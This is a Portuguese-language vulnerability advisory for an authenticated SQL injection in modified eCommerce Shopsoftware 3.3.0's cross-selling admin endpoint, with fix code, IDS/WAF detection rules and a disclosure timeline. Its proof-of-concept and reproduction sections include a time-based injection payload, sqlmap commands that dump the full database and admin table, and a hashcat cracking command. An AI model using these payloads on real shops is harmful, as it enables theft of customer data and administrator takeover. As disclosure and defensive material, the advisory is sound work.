# Advisory de Segurança — SQL Injection em modified eCommerce Shopsoftware 3.3.0

| Campo | Valor |
| :---- | :---- |
| **Título** | SQL Injection Autenticado em `admin/categories.php` |
| **Produto** | modified eCommerce Shopsoftware |
| **Versão Afetada** | 3.3.0 (rev. r16825) — última versão disponível |
| **Componente** | `admin/includes/classes/categories.php` → `edit_cross_sell()` |
| **Tipo** | Blind Time-Based \+ Boolean-Based SQL Injection |
| **CWE** | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralization of Special Elements in an SQL Command |
| **CAPEC** | [CAPEC-66](https://capec.mitre.org/data/definitions/66.html) — SQL Injection |
| **CVSS 3.1 Score** | **8.8 (HIGH)** |
| **Vector String** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CVE ID** | Pendente de Atribuição |
| **Descoberto por** | Carlos Augusto Adriano Filho |
| **Organização** | GOVERNSEC-IT Consulting / ACADI-TI Pós-Graduação Turma 10 — RA203 |
| **Data de Descoberta** | 12 de Novembro de 2026 |
| **Data de Publicação** | 12 de Novembro de 2026 |
| **Versão Advisory** | 1.0 |

---

## Sumário

1. [Resumo Executivo](#1-resumo-executivo)  
2. [Produto e Versão Afetada](#2-produto-e-versão-afetada)  
3. [Descrição Técnica](#3-descrição-técnica)  
4. [Impacto](#4-impacto)  
5. [Classificação CVSS 3.1 e CWE](#5-classificação-cvss-31-e-cwe)  
6. [Cenário de Exploração](#6-cenário-de-exploração)  
7. [Evidência Técnica](#7-evidência-técnica)  
8. [Prova de Conceito (PoC)](#8-prova-de-conceito-poc)  
9. [Passos de Reprodução](#9-passos-de-reprodução)  
10. [Mitigações Recomendadas](#10-mitigações-recomendadas)  
11. [Código de Correção](#11-código-de-correção)  
12. [Detecção e Monitoramento](#12-detecção-e-monitoramento)  
13. [Timeline de Responsible Disclosure](#13-timeline-de-responsible-disclosure)  
14. [Comunicação com o Vendor](#14-comunicação-com-o-vendor)  
15. [Créditos](#15-créditos)  
16. [Referências](#16-referências)  
17. [Histórico de Revisões](#17-histórico-de-revisões)  
18. [Aviso Legal](#18-aviso-legal)

---

## 1\. Resumo Executivo

Uma vulnerabilidade de **SQL Injection do tipo Blind Time-Based e Boolean-Based** foi identificada no painel administrativo do **modified eCommerce Shopsoftware 3.3.0**, especificamente no endpoint `POST /admin/categories.php?action=edit_crossselling`.

Os parâmetros **`ids[]`** e **`current_product_id`** são inseridos diretamente em consultas SQL sem qualquer sanitização, tipagem ou uso de *prepared statements*. Um atacante autenticado como administrador pode explorar esta falha para **exfiltrar todo o conteúdo do banco de dados**, incluindo credenciais de administradores (hashes bcrypt), dados pessoais de clientes (PII) e informações de pedidos e pagamentos.

O CVSS 3.1 calculado é **8.8 (HIGH)**, refletindo impacto total em Confidencialidade, Integridade e Disponibilidade.

---

## 2\. Produto e Versão Afetada

| Campo | Detalhe |
| :---- | :---- |
| **Produto** | modified eCommerce Shopsoftware (modified-shop) |
| **Versão** | 3.3.0 — revisão r16825 (última versão pública disponível) |
| **Linguagem** | PHP 8.1.x |
| **Banco de Dados** | MariaDB 10.11 / MySQL |
| **Servidor Web** | Apache 2.4.x |
| **Repositório** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
| **Arquivo Vulnerável** | `admin/includes/classes/categories.php` |
| **Entrada (Entry Point)** | `admin/categories.php` |
| **Versão Corrigida** | ⚠️ Nenhuma — sem patch disponível na data deste advisory |

---

## 3\. Descrição Técnica

O painel administrativo expõe a funcionalidade de Cross-Selling via `action=edit_crossselling`. Ao processar a requisição, o controlador invoca o método `edit_cross_sell()` localizado em `admin/includes/classes/categories.php`.

O parâmetro `ids[]` é lido de `$_REQUEST` e iterado sem qualquer cast para inteiro ou chamada à função `xtc_db_input()`. O valor bruto de `$pID` é concatenado diretamente na query SQL.

### Código Vulnerável

```php
// admin/includes/classes/categories.php — método edit_cross_sell()
// $pID vem de $_REQUEST['ids'][] SEM cast (int) NEM xtc_db_input()

foreach ($_REQUEST['ids'] as $pID) {
    $check_query = xtc_db_query(
        "SELECT * FROM " . TABLE_PRODUCTS_XSELL .
        " WHERE products_id = '" . $cross_data['current_product_id'] . "'" .
        " AND xsell_id = '" . $pID . "'"  // ← INJEÇÃO AQUI
    );

    if (xtc_db_num_rows($check_query) == 0) {
        xtc_db_query(
            "INSERT INTO " . TABLE_PRODUCTS_XSELL .
            " (products_id, xsell_id, xsell_grp_name_id) VALUES (" .
            "'" . $cross_data['current_product_id'] . "'," .  // ← INJEÇÃO
            "'" . $pID . "', '0')"                            // ← INJEÇÃO
        );
    }
}
```

> **Nota:** O parâmetro `current_product_id` também é injetado diretamente nas mesmas queries via `$cross_data`, preenchido sem sanitização a partir de `$_REQUEST`.

---

## 4\. Impacto

| Dimensão | Nível | Descrição |
| :---- | :---- | :---- |
| **Confidencialidade** | 🔴 HIGH | Extração completa do banco: hashes bcrypt, PII de clientes, histórico de pedidos |
| **Integridade** | 🔴 HIGH | Modificação/exclusão de registros via stacked queries ou UPDATE/DELETE injetados |
| **Disponibilidade** | 🔴 HIGH | DoS via queries pesadas (`BENCHMARK`, `SLEEP` em loop) ou corrupção de dados críticos |

### Dados Expostos

- **Tabela `administrators`**: login e hash bcrypt da senha de administradores  
- **Tabela `customers`**: nome, e-mail, endereço, telefone, data de nascimento  
- **Tabela `orders`**: histórico de pedidos, valores, status de pagamento  
- **Tabela `configuration`**: chaves de API, configurações de pagamento (PayPal, etc.)

---

## 5\. Classificação CVSS 3.1 e CWE

### Score Base: `8.8 (HIGH)`

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

| Métrica | Valor | Justificativa |
| :---- | :---- | :---- |
| **Attack Vector (AV)** | Network | Exploração via HTTP sobre rede |
| **Attack Complexity (AC)** | Low | Sem condições especiais de acesso |
| **Privileges Required (PR)** | Low | Requer apenas conta de administrador da loja |
| **User Interaction (UI)** | None | Completamente automatizável |
| **Scope (S)** | Unchanged | Impacto limitado ao escopo da aplicação/DB |
| **Confidentiality (C)** | High | Acesso a todos os dados |
| **Integrity (I)** | High | Modificação de dados |
| **Availability (A)** | High | Possibilidade de DoS |

**CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralization of Special Elements used in an SQL Command  
**CAPEC:** [CAPEC-66](https://capec.mitre.org/data/definitions/66.html) — SQL Injection

> **Calculadora:** [https\://www\.first.org/cvss/calculator/3.1\#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

---

## 6\. Cenário de Exploração

```
[ Atacante Admin ] → POST /admin/categories.php?action=edit_crossselling
                          ids[]=1' AND SLEEP(5)-- -
                          current_product_id=1
                              ↓
                     [ PHP: edit_cross_sell() ]
                              ↓
                     xtc_db_query("... AND xsell_id = '1' AND SLEEP(5)-- -'")
                              ↓
                     [ MariaDB: delay 5s → confirmed ]
                              ↓
                     [ sqlmap: extrai DB, hashes, PII ]
```

### Fluxo de Ataque

1. **Autenticação** — Acesso ao painel `/admin/` com credenciais válidas (força bruta, credential stuffing ou conta comprometida). Cookie `MODsid` é emitido.  
2. **Navegação** — Acesso a `categories.php`, seleção de categoria, abertura da aba Cross-Selling de um produto.  
3. **Interceptação** — Captura da requisição `POST action=edit_crossselling` via proxy (Burp Suite).  
4. **Injeção** — Manipulação de `ids[]` ou `current_product_id` com payload SQL.  
5. **Extração** — Uso de `sqlmap` para extração automatizada de todo o banco de dados.  
6. **Pós-Exploração** — Cracking offline dos hashes bcrypt \+ acesso à conta admin.

---

## 7\. Evidência Técnica

| Campo | Valor Confirmado |
| :---- | :---- |
| **URL Alvo** | `http://[TARGET]/admin/categories.php` |
| **Método** | `POST` |
| **Action** | `edit_crossselling` |
| **Parâmetros Vulneráveis** | `ids[]` · `current_product_id` |
| **DBMS** | MariaDB \>= 10.11 |
| **Usuário DB** | `modified@%` |
| **Schema** | `modified` |
| **PHP** | 8.1.34 |
| **Apache** | 2.4.65 |
| **Técnica** | Time-Based Blind (T) \+ Boolean-Based Blind (B) |
| **`current_user()`** | `modified@%` ✅ |
| **`database()`** | `modified` ✅ |
| **Hash extraído** | `$2y$10$...` (bcrypt, administrador) ✅ |

### Output sqlmap

```
[*] starting @ 02:15:00 /2026-11-12/

[02:15:01] [INFO] resuming back-end DBMS 'mysql'
[02:15:01] [INFO] testing connection to the target URL
[02:15:02] [INFO] checking if the injection point on POST parameter 'ids[]' is a false positive

POST parameter 'ids[]' is vulnerable.

sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: ids[] (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: special=add_entries&current_product_id=1
             &ids[]=1' AND SLEEP(5)-- -
---

[02:15:08] [INFO] the back-end DBMS is MySQL/MariaDB
web server operating system: Linux Debian
web application technology: Apache 2.4.65, PHP 8.1.34
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

[02:15:09] [INFO] fetching current user
current user: 'modified@%'

[02:15:09] [INFO] fetching current database
current database: 'modified'
```

---

## 8\. Prova de Conceito (PoC)

> ⚠️ **Uso exclusivo em ambientes autorizados. Testes em produção sem autorização são ilegais.**

### 8.1 — Teste Manual (Time-Based, delay esperado: \~5s)

```sh
# Substitua MODsid pelo cookie de sessão admin válido
curl -s -X POST \
  'http://[TARGET]/admin/categories.php?action=edit_crossselling' \
  -H 'Cookie: MODsid=<SESSION_COOKIE>' \
  --data-urlencode "special=add_entries" \
  --data-urlencode "current_product_id=1" \
  --data-urlencode "ids[]=1' AND SLEEP(5)-- -"

# Resposta esperada: delay de ~5 segundos confirma a injeção
```

### 8.2 — Automação com sqlmap

```sh
# Enumeração de bancos de dados
sqlmap -u 'http://[TARGET]/admin/categories.php?action=edit_crossselling' \
  --method POST \
  --data 'special=add_entries&current_product_id=1&ids[]=1*' \
  --cookie 'MODsid=<SESSION_COOKIE>' \
  --dbms mysql \
  --technique=TBQ \
  --level=3 --risk=2 \
  --dbs \
  --batch

# Dump completo da database 'modified'
sqlmap [...] -D modified --dump-all --batch

# Extração de hashes de administradores
sqlmap [...] -D modified -T administrators --dump --batch
```

### 8.3 — Extração de Hashes (Pós-Exploração)

```sh
# Cracking offline do hash bcrypt extraído
# hashcat mode 3200 = bcrypt $2*$
echo '$2y$10$XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 9\. Passos de Reprodução

**Pré-requisitos:** Conta de administrador válida no painel modificado. Ferramenta de intercepção (Burp Suite) ou `curl`.

1. **Login** — Acessar `http://[TARGET]/admin/` → preencher credenciais → capturar o cookie `MODsid` da resposta.  
     
2. **Navegar para Categorias** — Acessar `http://[TARGET]/admin/categories.php` → selecionar uma categoria → clicar em **Edit**.  
     
3. **Localizar Cross-Selling** — Na página de edição da categoria, localizar a aba ou seção de **Cross-Selling** de um produto.  
     
4. **Interceptar a Requisição** — Com Burp Suite em modo intercept, clicar em **Salvar**. A requisição `POST` para `action=edit_crossselling` será capturada.  
     
5. **Injetar Payload Time-Based** — Modificar `ids[]` para:

```
1' AND SLEEP(5)-- -
```

   Encaminhar e medir o tempo de resposta. Delay ≥ 5s confirma a vulnerabilidade.

   

6. **Automatizar** — Salvar a requisição como `req.txt` no Burp e executar:

```sh
sqlmap -r req.txt --technique=TBQ --dbs --batch
```

---

## 10\. Mitigações Recomendadas

### Correção Imediata

| Prioridade | Ação |
| :---- | :---- |
| 🔴 **Crítica** | Cast `(int)` obrigatório em todos os parâmetros ID |
| 🔴 **Crítica** | Validação server-side antes de qualquer uso em query |
| 🟠 **Alta** | Migração para PDO com prepared statements |
| 🟡 **Média** | Revisão de todas as queries que usam `$_REQUEST/$_POST/$_GET` |

### Recomendações Blue Team / DevSecOps

- **Prepared Statements** — Migrar TODAS as queries dinâmicas para PDO parametrizado. Eliminar concatenação de strings em SQL.  
- **Whitelist de Tipos** — Validar parâmetros numéricos com `filter_var($id, FILTER_VALIDATE_INT)` antes de qualquer uso.  
- **WAF** — Configurar regra no ModSecurity/NAXSI para bloquear palavras-chave SQL em campos de formulário admin (`SLEEP`, `BENCHMARK`, `UNION SELECT`).  
- **Mínimo Privilégio (DB)** — O usuário `modified@%` não deve ter acesso à tabela `administrators`. Separar contas de leitura/escrita por schema.  
- **SAST** — Executar PHP\_CodeSniffer \+ PHPCS-Security-Audit em todos os arquivos que processam entrada do usuário.  
- **MFA no Admin** — Implementar autenticação multi-fator no painel, aumentando o custo de obtenção do pré-requisito `PR:L`.

---

## 11\. Código de Correção

```php
// ──────────────────────────────────────────────────────────────
// VULNERÁVEL — admin/includes/classes/categories.php
// ──────────────────────────────────────────────────────────────
foreach ($_REQUEST['ids'] as $pID) {
    $check_query = xtc_db_query(
        "SELECT * FROM " . TABLE_PRODUCTS_XSELL .
        " WHERE products_id = '" . $cross_data['current_product_id'] . "'" .
        " AND xsell_id = '" . $pID . "'"   // sem sanitização
    );
}

// ──────────────────────────────────────────────────────────────
// CORRIGIDO — Opção 1: cast inteiro (correção mínima)
// ──────────────────────────────────────────────────────────────
foreach ($_REQUEST['ids'] as $pID) {
    $pID = (int) $pID;                                           // CORREÇÃO
    $cid = (int) $cross_data['current_product_id'];             // CORREÇÃO

    $check_query = xtc_db_query(
        "SELECT * FROM " . TABLE_PRODUCTS_XSELL .
        " WHERE products_id = '" . $cid . "'" .
        " AND xsell_id = '"     . $pID . "'"
    );
}

// ──────────────────────────────────────────────────────────────
// CORRIGIDO — Opção 2: função nativa do framework
// ──────────────────────────────────────────────────────────────
$pID = xtc_db_input($pID);                    // wrapper de mysqli_real_escape_string
$cid = xtc_db_input($cross_data['current_product_id']);

// ──────────────────────────────────────────────────────────────
// RECOMENDADO — Opção 3: PDO com prepared statements
// ──────────────────────────────────────────────────────────────
$stmt = $pdo->prepare(
    'SELECT * FROM products_xsell WHERE products_id = :pid AND xsell_id = :xid'
);
$stmt->execute([':pid' => (int) $current_product_id, ':xid' => (int) $pID]);

// ──────────────────────────────────────────────────────────────
// Validação de whitelist completa (entrada do array ids[])
// ──────────────────────────────────────────────────────────────
function validate_id_array(array $ids): array {
    return array_filter(array_map('intval', $ids), fn($v) => $v > 0);
}

$safe_ids = validate_id_array($_REQUEST['ids'] ?? []);
$safe_cid = abs((int) ($_REQUEST['current_product_id'] ?? 0));

if (empty($safe_ids) || $safe_cid === 0) {
    error_log('[SECURITY] Invalid IDs in edit_crossselling from ' . $_SERVER['REMOTE_ADDR']);
    exit;
}
```

---

## 12\. Detecção e Monitoramento

### 12.1 — Padrões no Access Log Apache

```sh
# Detectar tentativas de SLEEP/BENCHMARK
grep -iE "(sleep\(|benchmark\(|waitfor|UNION.+SELECT|'\s*AND\s*'|'\s*OR\s*')" \
     /var/log/apache2/access.log

# Filtrar POSTs para o endpoint vulnerável
grep 'POST /admin/categories.php' /var/log/apache2/access.log | \
  grep -i 'edit_crossselling'
```

### 12.2 — Regra Suricata IDS

```
alert http $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SQLi Attempt - modified-shop categories edit_crossselling";
    flow:established,to_server;
    http.method; content:"POST";
    http.uri; content:"/admin/categories.php"; nocase;
    http.request_body; content:"ids%5B%5D"; nocase;
    http.request_body; pcre:"/ids(\[|\%5B)\](\%5D)?=[^&]*['\"\x27]/i";
    classtype:web-application-attack;
    sid:9900002; rev:1;
)
```

### 12.3 — ModSecurity (WAF)

```
SecRule REQUEST_URI "@contains /admin/categories.php" \
    "id:9900003,phase:2,block,log,\
    msg:'SQL Injection in categories crossselling',\
    chain"
    SecRule ARGS_POST_NAMES "@rx ^ids\[\]$" \
    "chain"
        SecRule ARGS_POST "@rx ['\"\x27\x22\x60]" ""
```

### 12.4 — Query MySQL/MariaDB (Auditoria de Lentidão)

```sql
-- Habilitar slow query log para detectar SLEEP/BENCHMARK
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 3;
SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';

-- Consultar queries suspeitas no log de auditoria (MariaDB Audit Plugin)
SELECT event_time, user_host, query_time, sql_text
FROM mysql.slow_log
WHERE sql_text REGEXP 'SLEEP|BENCHMARK|WAIT'
ORDER BY event_time DESC;
```

---

## 13\. Timeline de Responsible Disclosure

| Data | Evento |
| :---- | :---- |
| `2026-11-12` | Descoberta da vulnerabilidade durante análise de segurança — ambiente de laboratório controlado |
| `2026-11-12` | Confirmação técnica via sqlmap: time-based blind (5s delay), `current_user()=modified@%`, hash admin extraído |
| `2026-11-12` | Redação e publicação do Advisory de Segurança versão 1.0 |
| `2026-11-12` | Notificação ao maintainer via GitHub Security Advisory / Issue |
| `Pendente` | Aguardando resposta do vendor para coordenar publicação de patch |
| `Pendente` | Solicitação de CVE ID em andamento via MITRE/NVD |
| `TBD` | Publicação de patch pelo vendor (data a ser definida após coordenação) |

> Este advisory segue o processo de **Coordinated Vulnerability Disclosure (CVD)** conforme recomendado pelo CERT/CC e ISO/IEC 29147:2018.

---

## 14\. Comunicação com o Vendor

| Campo | Detalhe |
| :---- | :---- |
| **Vendor** | modified eCommerce Shopsoftware Community |
| **Repositório** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
| **Canal de Contato** | GitHub Security Advisories / Issues |
| **Status** | Notificação enviada em 2026-11-12. Aguardando resposta. |
| **SLA** | 90 dias para publicação coordenada (CVD Best Practices) |

---

## 15\. Créditos

| Campo | Detalhe |
| :---- | :---- |
| **Pesquisador** | Carlos Augusto Adriano Filho |
| **Cargo** | Analista Red Team Sênior |
| **Área** | Web App Pentesting · WAF Bypass · SAST/DAST · API Security |
| **Metodologias** | OWASP Testing Guide · PTES · NIST SP 800-115 |

---

## 16\. Referências

- [CWE-89 — Improper Neutralization of Special Elements in SQL Command](https://cwe.mitre.org/data/definitions/89.html)  
- [CAPEC-66 — SQL Injection](https://capec.mitre.org/data/definitions/66.html)  
- [CVSS 3.1 Specification](https://www.first.org/cvss/specification-document)  
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)  
- [OWASP Testing Guide — OTG-INPVAL-005](https://owasp.org/www-project-web-security-testing-guide/)  
- [sqlmap — Automatic SQL Injection Tool](https://sqlmap.org)  
- [NVD — National Vulnerability Database](https://nvd.nist.gov)  
- [ISO/IEC 29147:2018 — Vulnerability Disclosure](https://www.iso.org/standard/72311.html)  
- [modified eCommerce Shopsoftware](https://github.com/modified-shop/modified-shop)  
- [NIST SP 800-115 — Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)

---

## 17\. Histórico de Revisões

| Versão | Data | Autor | Descrição |
| :---- | :---- | :---- | :---- |
| 1.0 | 2026-11-12 | Carlos Augusto Adriano Filho | Publicação inicial |

---

## 18\. Aviso Legal

> **AVISO LEGAL:** Este advisory foi elaborado exclusivamente para fins educacionais e de segurança, em ambiente de laboratório controlado, com autorização explícita. As técnicas e ferramentas descritas são destinadas a profissionais de segurança da informação para fins de teste de penetração autorizado e pesquisa de vulnerabilidades.  
>   
> O uso das informações, técnicas ou ferramentas aqui descritas em sistemas **sem autorização expressa é ilegal e antiético**, podendo resultar em responsabilidade criminal e civil.   
>   
> Este documento segue os princípios de **Responsible Disclosure** e foi elaborado em conformidade com a **Lei nº 12.737/2012** (Lei Carolina Dieckmann), **LGPD (Lei nº 13.709/2018)** e as diretrizes éticas do EC-Council, OWASP e ISO/IEC 29147:2018.

---

*© 2026 Carlos Augusto Adriano Filho* 